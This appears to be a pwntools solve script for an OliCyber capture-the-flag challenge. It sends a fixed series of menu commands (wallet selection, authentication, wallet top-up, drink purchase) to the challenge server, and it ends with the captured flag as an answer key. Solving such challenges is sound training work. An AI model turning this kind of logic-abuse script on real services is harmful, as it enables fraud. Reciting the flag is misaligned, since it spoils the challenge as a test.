from pwn import *

host = "the-cantina.challs.olicyber.it"
port = 38083

r = remote(host,port)
r.sendline(b"select_coin")
r.sendline(b"OLI")
r.sendline(b"select_wallet")
r.sendline(b"0xBABE")
r.sendline(b"authenticate")
r.sendline(b"Han")
r.sendline(b"Vader")
r.sendline(b"Kashyyyk")
r.sendline(b"topup_wallet")
r.sendline(b"buy_drink")
r.sendline(b"Darksaber Distillate")
r.interactive()

# flag{wh47_4_suspici0us_drink_e3de4aa8}
